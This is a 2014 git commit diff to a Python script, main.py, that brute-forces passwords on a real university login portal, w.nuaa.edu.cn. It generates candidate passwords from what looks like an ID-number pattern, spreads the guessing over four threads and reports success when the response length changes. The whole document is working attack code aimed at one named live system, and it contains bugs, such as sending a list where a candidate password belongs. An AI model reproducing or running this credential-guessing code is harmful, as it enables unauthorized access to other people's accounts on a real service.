826e9c400dcb80ac4bb441cceaa40bb1b814cb85
lms <lmscsomg@gmail.com>
2014-10-27 23:25:59 +0800

    support multiprocessing

--- main.py
+++ main.py
@@ -2,6 +2,8 @@ __author__ = 'lms'
 
 import requests
 import time
+import multiprocessing.dummy as multiThreading
+import multiprocessing
 
 request_url = "http://w.nuaa.edu.cn/iPortal/action/doLogin.do"
 login_info = {
@@ -26,41 +28,43 @@ headers = {
             'X-Requested-With': 'XMLHttpRequest'
 
             }
-
+password_array = ['', '', '', '']
+password_divi = [0, 25, 50, 75]
 password_prefix = ['01', '02', '03', '04', '05', '06', '07', '08', '09']
+password_middle = ['00', '01', '02', '03', '04', '05', '06', '07', '08', '09']
 password_index = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
 password_male = ['1', '3', '5', '7', '9']
 password_female = ['0', '2', '4', '6', '8']
 
 for prefix in range(10, 32):
     password_prefix.append(str(prefix))
+for middle in range(10, 100):
+    password_middle.append(str(middle))
+
+def verify(index, sem):
+    for j in range(25):
+        for m in range(5):
+            for n in range(10):
+                if sem.is_set():
+                    return
+
+                password_array[index] = '27'+password_middle[password_divi[index]+j]+password_male[m]+password_index[n]
+                login_info['password'] = password_index
+
+                loginRequest = requests.post(request_url, data=login_info, headers=headers)
+                print password_array[index]
+                if loginRequest.headers['content-length'] >= '258':
+                    password = password_array[index]
+                    print "The password is " + password
+                    sem.set()
+                    end_time = time.time()
+                    print "The time spent is " + str(end_time-start_time)
+                    return
 
 
-exit_flag = 0
+if __name__ == "__main__":
+    sem = multiThreading.Event()
+    start_time = time.time()
+    for index in range(4):
+        multiThreading.Process(target=verify, args=(index, sem)).start()
 
-start_cpu = time.clock()
-for i in range(31):
-    for j in range(10):
-        for k in range(10):
-            for m in range(5):
-                for n in range(10):
-                    login_info['password'] = '27'+password_index[j]+password_index[k]\
-                                             +password_male[m]+password_index[n]
-                    print login_info['password']
-
-                    loginRequest = requests.post(request_url, data=login_info, headers=headers)
-                    if loginRequest.headers['content-length'] >= '258':
-                        print "The password is " + login_info['password']
-                        exit_flag = 1
-                        break
-                if exit_flag:
-                    break
-            if exit_flag:
-                break
-        if exit_flag:
-            break
-    if exit_flag:
-        break
-
-end_cpu = time.clock()
-print "The time spent is " + str(end_cpu-start_cpu)
